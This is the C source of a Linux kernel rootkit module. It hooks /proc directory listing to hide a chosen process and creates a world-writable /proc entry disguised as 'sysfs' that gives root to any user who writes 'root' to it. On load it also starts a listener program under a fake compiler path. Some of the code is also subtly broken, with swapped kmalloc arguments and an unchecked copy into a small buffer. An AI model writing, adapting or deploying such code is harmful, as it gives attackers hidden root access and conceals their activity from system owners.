#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/init.h>
#include <net/sock.h>
#include <linux/file.h>
#include <linux/stat.h>

static int HIDEPID = -1;

#define HIDEPROCNAME "sysfs"
#define SHELL "/usr/bin/x86_64-gnu-redhat-cpp"
#define CLEANUP "/usr/bin/ls"

typedef int (*readdir_t)(struct file *, void *, filldir_t);

readdir_t orig_proc_readdir=NULL;

filldir_t proc_filldir = NULL;
/*Convert string to integer. Strip non-integer characters. Courtesy
  adore-ng*/
int adore_atoi(const char *str) {
    int ret = 0, mul = 1;
    const char *ptr;
    for (ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++)
        ;
    ptr--;
    while (ptr >= str) {
        if (*ptr < '0' || *ptr > '9')
            return -1;
        ret += (*ptr - '0') * mul;
        mul *= 10;
        ptr--;
    }

    return ret;
}

int my_proc_filldir(void *buf, const char *name, int nlen, loff_t off, ino_t ino, unsigned x) {
    /*If name is equal to our pid, then we return 0. This way,
      our pid isn't visible*/
    if ((HIDEPID >= 0) && (adore_atoi(name) == HIDEPID)) {
        return 0;
    }
    /*Otherwise, call original filldir*/
    return proc_filldir(buf, name, nlen, off, ino, x);
}

int my_proc_readdir(struct file *fp, void *buf, filldir_t filldir) {
    int r = 0;
    proc_filldir = filldir;
    /*invoke orig_proc_readdir with my_proc_filldir*/
    r = orig_proc_readdir(fp, buf, my_proc_filldir);
    return r;
}

int hide_pid(readdir_t *orig_readdir, readdir_t new_readdir) {
    struct file *filep;

    /*open /proc */
    if((filep = filp_open("/proc",O_RDONLY,0))==NULL) {
        return -1;
    }
    /*store proc's readdir*/
    if(orig_readdir)
        *orig_readdir = filep->f_op->readdir;
    /*set proc's readdir to new_readdir*/
    struct file_operations * f_op = filep->f_op;
    f_op->readdir = new_readdir;
    filep->f_op = f_op;
    filp_close(filep,0);

    return 0;
}

/*restore /proc's readdir*/
int restore (readdir_t orig_readdir) {
    struct file *filep;
    /*open /proc */
    if ((filep = filp_open("/proc", O_RDONLY, 0)) == NULL) {
        return -1;
    }
    struct file_operations * f_op = filep->f_op;
    f_op->readdir = orig_readdir;
    /*restore /proc's readdir*/
    filep->f_op = f_op;
    filp_close(filep, 0);
    return 0;
}

int len, temp;
char *msg;

int read_proc(struct file *filp,char *buf,size_t count,loff_t *offp ) {
    if(count > temp) {
        count = temp;
    }
    temp = temp - count;
    copy_to_user(buf, msg, count);
    if(count == 0)
        temp = len;
    return count;
}

int write_proc(struct file *filp, const char *buf, size_t count, loff_t *offp) {
    struct cred * cred;
    copy_from_user(msg,buf,count);
    if (strncmp(buf,"root", 4) == 0) {
        cred = (struct cred * )__task_cred(current);
        cred-> uid.val = 0;
        cred-> gid.val = 0;
        cred-> suid.val = 0;
        cred-> euid.val = 0;
        cred-> egid.val = 0;
        cred-> fsuid.val = 0;
        cred-> fsgid.val = 0;
        printk("now you are root\n");
    }
    len = count;
    temp = len;
    int pid = adore_atoi(buf);
    HIDEPID = pid;
    return count;
}

struct file_operations proc_fops = {
    read: read_proc,
    write: write_proc
};

void create_new_proc_entry(char *proc_name) {
    proc_create(proc_name, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH, NULL, &proc_fops);
    msg = kmalloc(GFP_KERNEL, 10 * sizeof(char));
}


int start_listener(void) {
    char *argv[] = {SHELL, NULL};
    static char *env[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL
    };
    return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}

int kill_listener(void) {
    char *argv[] = {CLEANUP, NULL, NULL};
    static char *env[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL
    };
    return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}

static int __init myinit(void)
{
    hide_pid(&orig_proc_readdir,my_proc_readdir);
    create_new_proc_entry(HIDEPROCNAME);
    start_listener();
    return 0;
}

static void myexit(void)
{
    restore(orig_proc_readdir);
    remove_proc_entry(HIDEPROCNAME, NULL);
    kill_listener();
    kfree(msg);
}

module_init(myinit);
module_exit(myexit);

MODULE_LICENSE("GPL");
